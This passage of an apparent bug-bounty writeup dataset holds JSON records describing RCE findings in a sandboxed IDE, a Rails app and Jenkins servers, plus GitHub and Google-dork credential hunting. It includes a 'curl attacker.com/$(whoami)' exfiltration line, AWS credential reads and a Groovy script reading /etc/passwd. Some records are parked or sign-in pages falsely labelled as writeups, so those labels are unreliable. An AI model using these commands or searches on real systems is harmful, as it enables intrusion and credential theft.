which will be helpful for further exploitation. but.. Note : Before proceeding for further exploitation first read the programs policy, if you are allowed to do further exploitation then go for it or else submit a request and take approval and then ./exploit 😎 Here are 2 good blogs for learning privilege escalation techniques. https://blog.g0tmi1k.com/2011/08/basic-linux-privilege-escalation/ A guide to Linux Privilege Escalation What is Privilege escalation? Most computer systems are designed for use with multiple users. Privileges mean what a… payatu.com In my next upcoming blog i will try to write about “ Rooting Server and gaining more privileges after RCE ”. -- -- 1 Written by Mohammed Abdul Raheem 385 followers · 12 following Product Security Engineer and Ethical Hacker Responses ( 1 ) See all responses Help Status About Careers Press Blog Privacy Rules Terms Text to speech"}
{"source_url": "https://jatindhankhar.in/blog/responsible-disclosure-breaking-out-of-a-sandboxed-editor-to-perform-rce/", "title": "Responsible Disclosure:  Breaking out of a Sandboxed Editor to perform RCE - Weblog of JD", "friendly_explanation": "This is a bug bounty writeup from https://jatindhankhar.in/blog/responsible-disclosure-breaking-out-of-a-sandboxed-editor-to-perform-rce/. It explains in detail how the bug was found, exploited, and remediated. Here’s the full content:\n\nResponsible Disclosure: Breaking out of a Sandboxed Editor to perform RCE - Weblog of JD Skip links Skip to primary navigation Skip to content Skip to footer Weblog of JD About All Posts Blog Articles Labs Comics Toggle search Toggle menu Jatin Dhankhar Reader Coder Learner. Follow Keybase Twitter LinkedIn GitHub Stack Overflow YouTube Responsible Disclosure: Breaking out of a Sandboxed Editor to perform RCE 3 minute read Table tl;dr Story - Finding the issue - Trying out things - Reading AWS Credentials Timeline tl;dr Found a way to escape the sandboxed editor to perform Remote Code Execution which leads to the ability to view AWS credentials, SSL certificate and other stuff. Pretty much owning the entire machine Story - Finding the issue If you are still here after reading the tl;dr, I guess you are here for the story? So, let me give you one. While doing recon I found many sub-domains and IP addresses belonging to HackerEarth, one of them was https://[REDACTED]/#/home/node/he-theia/sandbox which was running an online ide built on top of vs-code named Theia IDE . At first glance, it looked pretty boring, after all, it’s an IDE running in a browser (wait, that’s normal since most of them are electron based ) So, anyway, I played around with it for a while, the ultimate goal was to execute random code on the machine. But, they removed the terminal view command from the IDE shortcuts and menu. So, I tried to “run” the code file but that option was also not available. Then poking around I tried “Task: Run selected text” by bringing up the global action menu shortcut from vscode (ctrl/cmd + shift + p) and lo, and behold, it opened up a terminal. One I got the terminal access, it was easy to demonstrate the RCE. Trying out things I tried with the possibility of reading system config files and was able to read HackearEarth’s private SSL .crt and .key files. Pretty much, most of the system configuration files. I was even able to read the git log and original ide_fetcher.py that powered the ide initial startup commands since the repo cloned still had git metadata. Through some command-line fu, I was able to read the original arguments used to invoke the web-ide. Reading AWS Credentials After it was clear that I was able to read system files, write arbitrary files and command, I wanted to see if it was possible to use the terminal to read AWS credentials since the instance was hosted on AWS infrastructure just like the rest of the HackerEarth’s infrastructure. I first tried the usual metadata URL to access aws details curl http://169.254.169.254/latest/api/token but it didn’t work instead it gave me curl: failed to connect . Lost, I tried to ping the domain that also didn’t work. Then I found a blog by Puma Scan on Cloud Security - Attacking The Metadata Service There it was mentioned that attacking ECS metadata was different from attacking EC2 metadata service since it was served from a different domain. Then I checked the environment variable output again which I ignored earlier for some reason and it was right there in front of my eyes the whole time. It contained both the ECS_CONTAINER_METADATA_URI and AWS_CONTAINER_CREDENTIALS_RELATIVE_URI After that, it was just a curl away Timeline Tue, Dec 24 [ 7:35 PM IST] - Reached out to HackerEarth support about the issue Wed, Dec 25 [ 9:50 AM IST] - HackerEarth support team asked to submit the issue to them so that they can forward it to security team (Although I wanted to report it directly to security team) < Back and forth regarding submission > Wed, Dec 25, 2019 [ 10:25 PM IST ] - Submitted the issue along with detailed POC and evidence Thu, Dec 26, 2019 [ 05:49 PM IST ] - The instance was down. I asked HackerEarth for the confirmation of the fix. Fri, Dec 27, 2019 [ 12:57 PM IST] - HackerEarth confirmed the fix from their end. Mon, Jan 13, 2020 [12:32 PM IST] - Bounty Awarded Thu, Jan 23, 2020 [4:21 PM IST] - Bounty received Thu, Jan 23, 2020 [11:10 PM IST] - Disclosure draft shared Tue, Feb 04, 2020 [06:03 PM IST] - Disclosure draft approved Tue, Feb 04, 2020 [06:25 PM IST] - Blog published Updated: February 4, 2020 Twitter Facebook LinkedIn Previous Next Comments You May Also Enjoy Auto Refresh tokens in Ruby using Procs 2 minute read Auto refresh API tokens seamlessly in ruby using procs. Migrating an active repo from Bitbucket to Github 2 minute read Migrating an active repo with continuous pushes from Bitbucket to Github Heisenbug: A bug that happened in background only 3 minute read Debugging an issue that occurred in background processes while running same query in rapid succession Using Google App Script to Automate Treat Counter 3 minute read How I used google sheets with google app script to make a simple web app to automate treat counter Enter your search term... Feed © 2020 Weblog of JD. Powered by Jekyll & Minimal Mistakes ."}
{"source_url": "https://sites.google.com/view/harshjaiswalblog/rce-due-to-showexceptions", "title": "RCE due to ShowExceptions", "friendly_explanation": "This is a bug bounty writeup from https://sites.google.com/view/harshjaiswalblog/rce-due-to-showexceptions. It explains in detail how the bug was found, exploited, and remediated. Here’s the full content:\n\nRCE due to ShowExceptions Search this site Embedded Files Skip to main content Skip to navigation RCE due to ShowExceptions Hey guys, First of all a good news, I'm starting to blog my findings again, I have few posts ready just waiting for confirmation from companies to make them public. Getting Started So a few days back i started testing a private BB program, I found a straightforward RCE on it. I choose'd to start hunting on the main web app i.e. https://app.redacted.com , While going through i found an endpoint which downloads a CSV report via redacted.redacted.com (In-scope asset). The filename and its content was defined in the request it self, Something happened I was fuzzing around parameters, When i passed %0d to file_name the server threw an exception, The exception thrown because Rack's ShowExceptions was on. It's more than something As the the Rack's page suggests, \"Be careful when you use this on public-facing sites as it could reveal information helpful to attackers\", This must not be turned on on production environment. Rails (up to v4.0.2 NOT SURE) had a Secret token in /config/initializers/secret_token.rb. This token is used to verify the integrity of signed cookies (Any cookie set by your rails application is signed using this token), From Rails 4.0.2 this token is kept as environment variable `action_dispact.secret_token`. The exceptions page also leaks or better say includes this too. This token can be used to get RCE ( https://robertheaton.com/2013/07/22/how-to-hack-a-rails-app-using-its-secret-token/ ) You can read about this on the given link to understand and know how this works. I quickly used the above code to generate a cookie to execute `curl attacker.com/$(whoami)` and got an request to attacker.com/app. This RCE was applicable for both https://app.redacted.com/ and https://redacted.redacted.com/ because both shared same rails app. That's all folks :) Share/Retweet is much appreciated. Doubt? DM me at @rootxharsh Timeline 16 July : Bug found and Reported 16 July : Triaged 18 July : Fixed 20 July : $5000 Rewarded Google Sites Report abuse Page details Page updated Google Sites Report abuse"}
{"source_url": "https://blog.ripstech.com/2018/wordpress-design-flaw-leads-to-woocommerce-rce/", "title": "Sonar Blogs | Sonar", "friendly_explanation": "This is a bug bounty writeup from https://blog.ripstech.com/2018/wordpress-design-flaw-leads-to-woocommerce-rce/. It explains in detail how the bug was found, exploited, and remediated. Here’s the full content:\n\nSonar Blogs | Sonar Upcoming webinar! From detection to resolution: Introducing AI CodeFix GA - Register Now! Solutions Use cases AI code quality Validate AI code for security and quality Developer security Secure apps and prevent vulnerabilities Automated code review Ensure secure, high-quality code Platform engineering Remove friction and boost productivity Compliance reporting Automate proof of code compliance SDLC governance Align AI and developer standards All use cases Explore AI solutions Security solutions Code quality solutions Industries Healthcare Financial services Retail Federal government Customer recognition Our customers Customer stories Products Industry leading products SonarQube Cloud Cloud-based static analysis tool for your CI/CD workflows SonarQube Server Self-managed static analysis tool for continuous codebase inspection SonarQube for IDE Free IDE extension that provides on-the-fly analysis and coding guidance Advanced Security Secure use of open source code with advanced SAST and SCA 35+ languages and frameworks Java JavaScript TypeScript Python C# C++ C PHP Kotlin See all Resources Learn to build quality software SonarQube update hub NEW! Learn why 2025.1 is the most feature-packed LTA in SonarQube history Interactive demos Explore interactive product demos at your own pace Blog Stay connected with our latest development news and articles Events hub Let's meet up online or in person - browse our conferences and webinars, or watch previous talks Customer stories White papers Find in-depth articles on software best practices Learn Developer learning hub - covering essential topics Solution briefs Our library of solution briefs Go in depth SonarQube Server documentation Find more technical details of SonarQube Server SonarQube Cloud documentation Find more technical details of SonarQube Cloud SonarQube for IDE documentation Find more technical details of SonarQube for IDE Explore Sonar's rules Explore publicly available static analysis rules for all our languages Languages See our multi-language coverage Company Deliver better software About Us Sonar's industry leading solution enables developers to deliver high quality and secure software, and remediate existing code organically Careers Join our growing team Commitment to open source Our commitment to transparency, security, and continuous improvement Community Get latest updates, suggest features, and share your knowledge Partners Sonar partners with the best resellers to bring integrated code quality and security to you Contact us Have questions? Get in touch Media Newsroom News announcements, media coverage, and more Coverage Find articles about Sonar in the news Press releases The latest Sonar updates Customers An overview of customers using Sonar by industry Press Kit Executive headshots, quick stats, customer logos, and more Start for free Explore pricing Search modal toggle button Start for free Explore pricing Mobile menu toggle button Home Mobile menu toggle button Quality Security Integrations Company Sonar's latest blog posts Featured Post Solving the Engineering Productivity Paradox Sonar CEO, Tariq Shaukat, shares how AI-generated code absolutely must be reviewed before it's merged into your codebase, and how SonarQube can help. Read More Blog post Securing Go Applications With SonarQube: Real-World Examples Take a deep dive into some vulnerabilities in Go applications and understand how SonarQube Cloud helps developers detect and mitigate them during the development cycle. Read article > Blog post SonarQube IDE: Announcing support for AI-Native IDEs As development velocity accelerates, so does the potential for introducing subtle bugs and new security vulnerabilities. Read article > Get new blogs delivered directly to your inbox! Stay up-to-date with the latest Sonar content. Subscribe now to receive the latest blog articles. Email * I do not wish to receive promotional emails about upcoming SonarQube updates, new releases, news and events. I do not wish to receive promotional emails about upcoming SonarQube updates, new releases, news and events. cheq Sign up By submitting this form, you agree to the storing and processing of your personal data as described in the Privacy Policy and Cookie Policy . You can withdraw your consent by unsubscribing at any time. This site is protected by reCAPTCHA and the Google Privacy Policy and Terms of Service apply. Blog post Java24: Go deeper on parsing Java class files and broader with Stream gatherers Version 24 version introduces several new language features which collectively simplify code, and provide powerful tools for bytecode manipulation and advanced stream processing. Read article > Blog post Sonar's Take: Software Development Under America's AI Action Plan The White House's \"America's AI Action Plan\" aims to accelerate innovation, but for software development, speed must not compromise security. Nathan Jones, VP of Public Sector at Sonar, explores the recently published plan, risks of AI-generated code, and explains how static analysis tools help ensure AI adoption is both fast and secure. Read article > Blog post AI CodeFix is now generally available AI CodeFix seamlessly integrates AI-driven code fix suggestions into your development workflow with no additional cost for eligible SonarQube subscriptions. Read article > Blog post SonarQube Server 2025 Release 4.1: Faster analysis, stronger security, better coverage Our new 2025.4.1 release empowers developers with significant advancements to enhance code quality, security, and efficiency across multiple languages for your projects and while using open-source code. Read article > Blog post Cyber Resilience Act: Navigating speed and security with AI-coding Modern software development is caught between two powerful forces. On one hand, generative artificial intelligence (AI) coding tools are supercharging development velocity at the expense of rigorous security review. Read article > Blog post Java 23: Embrace the new era of code comments We’ve covered Java 22, and are now getting into Java 23, which introduces several new language features. We’ll focus on enhancing documentation, and how to leverage the new features with simple examples. Read article > Blog post What's the top bug in your language? Find out in The State of Code: Languages report The State of Code report analyzes 7.9B lines of code, revealing top security risks like log injection and XSS and how to fix them. Read article > Blog post How Sonar Helps Achieve a Strong SOC 2 Type II Report An SOC 2 Type II report is a critical attestation for service organizations, demonstrating their commitment to securely managing customer data over time. Learn how SonarQube can streamline your SOC 2 compliance journey! Read article > Blog post Protecting your AI code: How SonarQube defends against the \"Rules File Backdoor\" This case highlights an issue where configuration files were manipulated through hidden Unicode characters, which is a vector now commonly referred to as the \"Rules File Backdoor\". Read article > Prev 1 2 3 ● 40 Next Go to SonarSource homepage Sonar Solutions SAST AI solutions DevOps transformation Outsourcing software development Reduce & manage technical debt Secure by design Code coverage Code review For developers For enterprise Infrastructure as code Public sector Products SonarQube for IDE SonarQube Server SonarQube Cloud Pricing Start for free Explore pricing Company About Careers Commitment to open source Customers Partners Contact us Accessibility Brand identity Media Coverage Press releases Resources Product demos Events hub Customer stories White papers Learn Community Support Legal documentation Knowledge Explore Sonar's rules Blog Languages SonarQube Server documentation SonarQube Cloud documentation SonarQube for IDE documentation Follow SonarSource on Twitter Follow SonarSource on Linkedin AICPA SOC 2 MSECB Website Terms of Use Privacy Notice Cookie Policy Trust center Your Privacy Choices UK Modern Slavery Act Statement © 2008-2025 SonarSource SA. All rights reserved."}
{"source_url": "https://hawkinsecurity.com/2018/08/27/traversing-the-path-to-rce/", "title": "hawkinsecurity.com - This website is for sale! - hawkinsecurity Resources and Information.", "friendly_explanation": "This is a bug bounty writeup from https://hawkinsecurity.com/2018/08/27/traversing-the-path-to-rce/. It explains in detail how the bug was found, exploited, and remediated. Here’s the full content:\n\nhawkinsecurity.com - This website is for sale! - hawkinsecurity Resources and Information. hawkinsecurity.com Buy this domain The owner of hawkinsecurity.com is offering it for sale for an asking price of 599 EUR! This webpage was generated by the domain owner using Sedo Domain Parking . Disclaimer: Sedo maintains no relationship with third party advertisers. Reference to any specific service or trade mark is not controlled by Sedo nor does it constitute or imply its association, endorsement or recommendation. Privacy Policy"}
{"source_url": "https://blog.securitybreached.org/2018/09/07/rce-jenkins-instance-dosomething-org-bug-bounty-poc/", "title": "RCE Unsecure Jenkins Instance | Bug Bounty POC - Security Breached Blog", "friendly_explanation": "This is a bug bounty writeup from https://blog.securitybreached.org/2018/09/07/rce-jenkins-instance-dosomething-org-bug-bounty-poc/. It explains in detail how the bug was found, exploited, and remediated. Here’s the full content:\n\nRCE Unsecure Jenkins Instance | Bug Bounty POC - Security Breached Blog Skip to content Security Breached Blog Hack Smart, Stay Safe: Comprehensive Guides to Cybersecurity and Bug Bounty September 7, 2018 Share BugBounty POC 1 RCE Unsecure Jenkins Instance | Bug Bounty POC by MuhammadKhizerJaved Hi Guys, Honestly i was just getting bored and the blog wasn’t updated ina while so i decided to write this (Will share some more recent issues in a few days 🙂 ) So i want this Write Up to be concise.. to Let’s Just say I was checking subdomains of a site and found a subdomain jenkins-thor. dosomething.org so By Name i got that it Must be a Jenkins Instance so i opened that subdomain and got redirected to Github Login Page But the jenkins instant lac any kind of security for user as i visited it i simply Asks me to login to jenkins Instant using my Github account, As soon as loged inn to your jenkins instant i had complete admin access to your jenkins instant, and i was on the Users Page Like Now As Many of you guys already know that Jenkins Instance have a Script page where a user can go and Execute Groovy Script and You can also install a Plugin called Terminal for it So running a simple script as def command = “uname -a” def proc = commadn.execute() proc.waitfor() println “Process exit code: ${proc.exitValue()}” prinln “Std Err: ${proc.err.text}” println “std Out: ${proc.in.text}” or String fileContents = new File(‘/etc/passwd’).getText(‘UTF-8’) So this Groovy Script will execute the command So At this point you can be sure that you have an RCE in the service and you can execute any script command you want So i did that just to be sure So I wrote a Report related to it and Send it to the CTO of the website 🙂 and the issue was migrated Urgently TakeOut: Make Your You set the permissions for your Jenkins Instance Properly Make sure only allow Trusted users to install plugins or using Groovy Script Do read the Detailed Post by nahamsec https://nahamsec.com/secure-your-jenkins-instance-or-hackers-will-force-you-to/ Note: The Issue was Reported and is been Migrated the Blog was written after getting Permission from the CTO Matt ( https://twitter.com/mshmsh5000 ) 🙂 and also the site DoSomething Don;t have a Bug Bounty Program Anymore so Kindly avoid any kind of testing. Thanks for Reading ^_^ Share this: Click to share on X (Opens in new window) X Click to share on Facebook (Opens in new window) Facebook Click to share on LinkedIn (Opens in new window) LinkedIn Click to share on Reddit (Opens in new window) Reddit Click to share on Tumblr (Opens in new window) Tumblr Click to share on Telegram (Opens in new window) Telegram Click to share on WhatsApp (Opens in new window) WhatsApp Click to email a link to a friend (Opens in new window) Email Like this: Like Loading... Related Discover more from Security Breached Blog Subscribe to get the latest posts sent to your email. Type your email… Subscribe Tags: BugBounty POC RCE MuhammadKhizerJaved Dedicated and seasoned cybersecurity professional with over 8 years of active engagement in Bug Bounty Hunting, complemented by 4 years of experience as a Penetration Tester. Skilled in web and mobile application security testing and vulnerability assessment, I am actively involved in platforms like HackerOne and Bugcrowd. My contributions in the Bug Bounty arena have been recognized by over 200 reputable organizations, including Apple, Google, Facebook, The Government of Singapore, and The US Department of Defense. As an advocate for community growth, I actively contribute as a speaker, conducting sessions in local universities and presenting talks at various security conferences, both locally and internationally, including twice at BlackHat MEA, With a passion for growth, Always happy to connect with fellow security practitioners. Share on Facebook Share on X One reply on “RCE Unsecure Jenkins Instance | Bug Bounty POC” 腾讯玄武实验室安全动态推送(Tencent Xuanwu Lab Security Daily News) - 2018/09/10 says: October 18, 2018 at 3:04 am […] [ Popular Software ] Jenkins 错误配置导致的 RCE 漏洞实例： https://blog.securitybreached.org/2018/09/07/rce-jenkins-instance-dosomething-org-bug-bounty-poc/ […] Loading... Reply Leave a Reply Cancel reply This site uses Akismet to reduce spam. Learn how your comment data is processed. Next SQL Injection Vulnerability bootcamp.nutanix.com | Bug Bounty POC Previous Edmodo official number for custom text messages to any number around the world! You may also like April 19, 2023 by MuhammadKhizerJaved How I Manipulated My Rank on the Bugcrowd Platform This vulnerability on the Bugcrowd platform allowed manipulating rank on the platform using the API. Share this: Click to share on X (Opens in new window) X Click to share on Facebook (Opens in new window) Facebook Click to share on LinkedIn (Opens in new window) LinkedIn Click to share on Reddit (Opens in new window) Reddit Click to share on Tumblr (Opens in new window) Tumblr Click to share on Telegram (Opens in new window) Telegram Click to share on WhatsApp (Opens in new window) WhatsApp Click to email a link to a friend (Opens in new window) Email Like this: Like Loading... BugBounty POC / Tutorials 0 Read More September 8, 2018 by MuhammadKhizerJaved SQL Injection Vulnerability bootcamp.nutanix.com | Bug Bounty POC Hey Guys, So Another Concise Report about an SQLi I recently Found One day i was just going through some Twitter posts and saw one of my friend replied... Share this: Click to share on X (Opens in new window) X Click to share on Facebook (Opens in new window) Facebook Click to share on LinkedIn (Opens in new window) LinkedIn Click to share on Reddit (Opens in new window) Reddit Click to share on Tumblr (Opens in new window) Tumblr Click to share on Telegram (Opens in new window) Telegram Click to share on WhatsApp (Opens in new window) WhatsApp Click to email a link to a friend (Opens in new window) Email Like this: Like Loading... BugBounty POC 3 Read More Security Breached Blog © 2025. All Rights Reserved. Powered by WordPress . Theme by Alx . Loading Comments... Write a Comment... Email (Required) Name (Required) Website %d"}
{"source_url": "https://medium.com/@emenalf/how-i-got-hall-of-fame-in-two-fortune-500-companies-an-rce-story-9c89cead81ff", "title": "How I got hall of fame in two fortune 500 companies — An RCE story… | by Alfie | Medium", "friendly_explanation": "This is a bug bounty writeup from https://medium.com/@emenalf/how-i-got-hall-of-fame-in-two-fortune-500-companies-an-rce-story-9c89cead81ff. It explains in detail how the bug was found, exploited, and remediated. Here’s the full content:\n\nHow I got hall of fame in two fortune 500 companies — An RCE story… | by Alfie | Medium Sitemap Open in app Sign up Sign in Medium Logo Write Sign up Sign in How I got hall of fame in two fortune 500 companies — An RCE story… Alfie 2 min read · May 29, 2018 -- 2 Listen Share After doing some recon from the target company’s IPs using shodan, I narrowed my attack vector to focus on exploiting some jenkins applications which did not seem to need credentials.Using the shodan dork below, I was able to get a list of unrestricted jenkins instances Shodan dork for jenkins instances on port 8081 (Web GUI) From the original target list I had, I was able to enumerate a few candidates for exploitation.I could see the unrestricted instances, where one could get the code that was being pushed by the company’s development team and one could also change the configuration. This could be enough to report and get bounty — due to lack of confidentiality. But, as they say..try harder! From experience I have come to appreciate that the objective in bug bounty is to simulate a bigger impact as long as you are within the program’s bug bounty guidelines. On closer inspection, some nodes had the jenkin instance with the ‘manage jenkins’ configuration option. I was fortunate enough to find 2 hosts with this configuration option. Press enter or click to view image in full size ManageJenkins config option I chose to install the terminal plugin on both and hence could exhibit that remote code execution was possible! I quickly sent in my responsible disclosure email, and I got quick response; bounty and HoF followed :-) A couple of weeks later, I replicated the same issue on another fortune 500 company — another one! Further reading: https://the-infosec.com/2017/06/22/from-shodan-to-remote-code-execution-1-hacking-jenkins/ Twitter: Alfie Security Bug Bounty Remote Code Execution Information Security Penetration Testing -- -- 2 Written by Alfie 48 followers · 0 following Responses ( 2 ) See all responses Help Status About Careers Press Blog Privacy Rules Terms Text to speech"}
{"source_url": "https://sites.google.com/securifyinc.com/secblogs/yahoo-luminate-rce", "title": "Sign in - Google Accounts", "friendly_explanation": "This is a bug bounty writeup from https://sites.google.com/securifyinc.com/secblogs/yahoo-luminate-rce. It explains in detail how the bug was found, exploited, and remediated. Here’s the full content:\n\nSign in - Google Accounts Sign in Use your Google Account Email or phone Forgot email? Not your computer? Use a private browsing window to sign in. Learn more about using Guest mode Next Create account Afrikaans azərbaycan bosanski català Čeština Cymraeg Dansk Deutsch eesti English (United Kingdom) English (United States) Español (España) Español (Latinoamérica) euskara Filipino Français (Canada) Français (France) Gaeilge galego Hrvatski Indonesia isiZulu íslenska Italiano Kiswahili latviešu lietuvių magyar Melayu Nederlands norsk o‘zbek polski Português (Brasil) Português (Portugal) română shqip Slovenčina slovenščina srpski (latinica) Suomi Svenska Tiếng Việt Türkçe Ελληνικά беларуская български кыргызча қазақ тілі македонски монгол Русский српски (ћирилица) Українська ქართული հայերեն ‫עברית‬‎ ‫اردو‬‎ ‫العربية‬‎ ‫فارسی‬‎ አማርኛ नेपाली मराठी हिन्दी অসমীয়া বাংলা ਪੰਜਾਬੀ ગુજરાતી ଓଡ଼ିଆ தமிழ் తెలుగు ಕನ್ನಡ മലയാളം සිංහල ไทย ລາວ မြန်မာ ខ្មែរ 한국어 中文（香港） 日本語 简体中文 繁體中文 Help Privacy Terms"}
{"source_url": "https://medium.com/bugbountywriteup/from-recon-to-optimizing-rce-results-simple-story-with-one-of-the-biggest-ict-company-in-the-ea710bca487a", "title": "From Recon to Optimizing RCE Results - Simple Story with One of the Biggest ICT Company in the World | by YoKo Kho | InfoSec Write-ups", "friendly_explanation": "This is a bug bounty writeup from https://medium.com/bugbountywriteup/from-recon-to-optimizing-rce-results-simple-story-with-one-of-the-biggest-ict-company-in-the-ea710bca487a. It explains in detail how the bug was found, exploited, and remediated. Here’s the full content:\n\nFrom Recon to Optimizing RCE Results - Simple Story with One of the Biggest ICT Company in the World | by YoKo Kho | InfoSec Write-ups Sitemap Open in app Sign up Sign in Medium Logo Write Sign up Sign in InfoSec Write-ups · Follow publication A collection of write-ups from the best hackers in the world on topics ranging from bug bounties and CTFs to vulnhub machines, hardware challenges and real life encounters. Subscribe to our weekly newsletter for the coolest infosec updates: https://weekly.infosecwriteups.com/ Follow publication From Recon to Optimizing RCE Results - Simple Story with One of the Biggest ICT Company in the World How I Finally could Got into an Internal Network (and could accessing all of their internal assets) by Using Various Vulnerabilities. YoKo Kho 21 min read · Feb 18, 2020 -- 4 Listen Share بسم الله الرحمن الرحيم Mirroring from: http://www.firstsight.me/2020/02/from-recon-to-optimizing-rce-results-simple-story-with-one-of-the-biggest-ict-company-in-the-world/ Here is a little story about how I finally could got into an internal network (and could accessing all of their internal assets) at one of the biggest ICT company in the world by using various vulnerabilities (from sensitive data exposure, miss-configuration, until outdated version of application that vulnerable to unauthenticated RCE). Note: The program owner has given me a permission to release this article. PDF Version: Download here. So, as my other write-ups, this simple article will has 2 different approaches, which are: For the one that just need the main point of this article (yes, it could saves tons of minutes if readers understanding every flow already. Just please kindly see the TL;DR section), and For the one that need to understand the flow of execution or journey about these findings (InshaAllah it could tell the readers about some of my approaches). Hopefully it also could help people on “first stage” of their red teaming activity. Please kindly enjoy the story. I. TL;DR In short, there are 3 separate main points (let’s call it as stages) that was done as the process to gain their internal network, which are: Looking for the target’s credentials and internal IP Address at Github (including the pattern from both of those things) and continuing it with learn their development culture such as the used framework (it could make us easier to know if this one belongs to them or not). See Th3g3nt3lman talks at Bugcrowd University : Github Recon and Sensitive Data Exposure . The second one is the things that I don’t know why I do it, but it works! So, after got their passwords pattern, I use the simple google dorks to find if any accidental leakage that indexed by Google or not. The simple dork is: site:*.target.com AND intext:’their_password’ See One of my write-up: Information Disclosure at PayPal and Xoom (via Google Dork) . And the last one, I went back to my subdomain enumeration result and finally found one of their subdomains was using the outdated Atlassian Crowd version. By using the public exploit of CVE-2019–11580 , then I’m able to get the root access of this server. And while looking the internal IP of this server, I realize if this server was located at their internal network that has a direct internal access to non-public and to most of their public assets. And yes, as you could see, all of the information from the first point (Github recon) also could be use at this stage, since there are no any security perimeters (such as firewall and other) to communicate with other asset (Yes, this summary was strengthened because I successfully got several responses of their internal IP Address from other segment while pinging to their several assets). Press enter or click to view image in full size Figure 1 Atlassian Crowd — Outdated Version Press enter or click to view image in full size Figure 2 While got a Stable Reverse Shell Press enter or click to view image in full size Figure 3 While got Few (Internal IP) Responses after Pinging Few Public Assets II. THE JOURNEY So, back to December 2019 ago, I was planned to optimizing my hunting activity to the target that I’m active enough at them around the last few months. With a hope of get an RCE and could access into their internal assets, then I tried to conduct several activities from basic. 2.1. Recon from Github Because I have already (at least) thousands of their subdomains (and have no idea yet what I should do after found more than 90 findings within about 3 months), then I tried to get backs to basic again. In that situation, I tried to conduct a recon at Github to find some information that I might be able to get. (This talks could be a very good reference: Github Recon and Sensitive Data Exposure ). So, what is the point of this recon? Is it to look for credentials and test it to the affected service to find it valid or not? Mostly, yes. But I also tried other approaches that might lead me to something good. Things that I do was: 1. Collecting the credentials (whether still valid or not) and then try to find the pattern . This is to find out the default password that may be given by their administrator to every user while creating an account. The purpose of this one will be answered at the next section (#2.2). Press enter or click to view image in full size Figure 4 Few Valid and Invalid Credentials that Found at Github From this activity, I found around 50 different passwords. 2. Collecting the IP Address and try to learn the pattern . There are 2 points that could be achieved at this situation, which are First reason: as a supporting data for our report to the program (remember, there are analysts that standby to analyze the report before they send it to the program owner. Just don’t waste their time by reporting issues without any analysis). What I would like to say, if the result of the recon contains much of internal assets (can’t be access from public), then there are also the false alarm possibilities. So, when you have learnt the pattern, it can help you to analyze whether this repository belongs to them or not. Is it true? Well, at least I successfully found 5 P1s from this method. Press enter or click to view image in full size Figure 5 Few of Reported Issues Believe me, reporting an issue with an analysis will not waste the analyst’s time. And, they will also be happy to help you ask the program owner directly. The second reason is to make it easier for us to connect to the found asset when we gain the access to their internal network later. 3. And finally, the third one was learning their development culture. In this part, after about 16 hours of recon (separated in few days, I just spent around 2–3 hours a day), finally I found few (pattern) of the used framework to develop their internal application. It also makes it easier for us to identify which one that belongs to their assets At the other part, this point can also help everyone who are strong in the source code review to find out the weakness that might exist in the related application. So, these 3 things are the first stage of our recon to gather a lot of information about the target. But how do I do it? I’ll explain in the next section before continuing to the second stages. 2.1.1. The PoC — Recon from Github At his talks , Th3g3nt3lman has provided the comprehensive explanation. But there is nothing wrong if I try to explain it again. So there are common mistakes that happened among developers when using the collaboration software tools such as Github, which is they put credentials (especially the valid one) in the public repository. Of course there are many factors that make it can happened, either because the developers doesn’t know if Github has provided the “private” feature for free at this time, or the developers doesn’t realize if an unauthorized person could also find their public repositories and use the sensitive things for their own purposes. Note: Regardless of the factors, of course this is something that must be considered and gain important attention since this issue commonly used as one of the first stages to get into the target’s network. Back to topic, things needed to reproduce this recon are by login into our Github account and start to optimize the search by using various keywords such as: password “.target.tld” . Please kindly note, at the other side, the “password” keywords could also be replaced with other nice one such as telnet, ftp, ssh, mysql, jdbc, oracle, and other. target.tld “password_value_here” . To be honest, I don’t know how the Github’s search feature works, but by using these 2 different keywords, I got a different result that leads me to find something good. So, let’s say you found a repository that contain a password that belongs to one of those target’s asset. All you need to do is just don’t stop there . Explore more information from this repository, such as: i. Does this user store other credentials (of the target) at those found repository or from other repositories that owned by the user itself? This could be done by using the simple keyword (such as password , pwd , pass , and similar like that) to this repository specifically. Press enter or click to view image in full size Figure 6 Sample of Specific Search to Specific Repository Press enter or click to view image in full size Figure 7 Sample of Specific Search to Repositories Owned by this User Specifically ii. Does this repository have another endpoint information? This could also be done by using the simple keyword (such as target.tld ) to this repository specifically. How if we don’t find anything? Then try to look to another repository owned by this user. iii. If both of those flow “don’t work”, then try to find other users who collaborate with this user in this repository. Let’s say, you found B user. Then try visiting those users and repeat the first (i) and second (ii) step in this user account to find other possible good information. As a recap, I made a simple mind map that might be useful for readers: Press enter or click to view image in full size Figure 8 Mind Map of Simple Github Recon 2.1.2. Commonly Asked Yes, I hear you. All of these (manual) activities will take a lot of time and there is no guarantee if we could find interesting information. But, that’s the point of testing/hunting, right? This is not a common competition that is commonly made vulnerable by design (not every competition is like this, but some are similar to this), this is something we don’t know for sure if we haven’t test it . Are there any automation tools out there that could be used to help us conduct this activity? Yes, a lot. But when I tested several public tools, I didn’t find much things that I found from this manual activity. So, the automation tools are useless? No, I’m not saying that. Combining both automation and manual way is a wise thing to do to optimize the result. If the automation tools don’t find things that I found from the manual way, it also applies vice versa. 2.2. Recon from Google Dork After I thought that I had gathered enough information, then I went to the next stages. To be honest, I have no idea why I did this, but it seemed very reasonable to do it at that time. In short, I tried using a simple Google Dork, which is by put their internal (private) subdomain and the password patterns that I found as keywords. Note 1: How I know about their internal (private) subdomains? To answer this, please kindly refer to the explanation at the first stages. To summarize, from the first stages recon activity, I found an interesting subdomain that contained several more subdomains. From here, I assume if this subdomain is used by them as part of the development area. Press enter or click to view image in full size Figure 9 A subdomain that Contain Multiple Subdomain — For Development Area As stated earlier, since it is an internal subdomain (private) one, then all of these subdomains can’t be accessed from public area. Note 2: To know more details about recon with Google Dork, just please kindly refer to one of my write-up about PayPal and Xoom . And here is the simple keywords that I used: site: *.subx.target.tld AND intext:' one_of_password_pattern_value_here ' The reason behind this one is: I’m trying to find any possible sensitive information (containing those password pattern) that might be available at that subdomain (although I know if those subdomain is only available with internal access). And guess what? It works! Press enter or click to view image in full size Figure 10 Found much of Sensitive Information From this stages, I got a lot of information such as credentials (for the web and other services such as FTP or SSH), other endpoints, internal IP Addresses, and more. One good thing, some of information can be accessed from public area, but some of them requires an internal access. Please kindly note, by optimizing the used keywords, we can also enumerate more information from this recon. For example, just change the “password pattern” in the intext parameter with other values such as found IP Address (just put the first two octet), product name (Oracle, MySQL, MSSQL, and other), services name (FTP, SSH, DB, and other), other keywords that commonly used for login activities (such as password, pwd, pass, username, userid, and other), or other keywords that commonly has a relation with login (such as 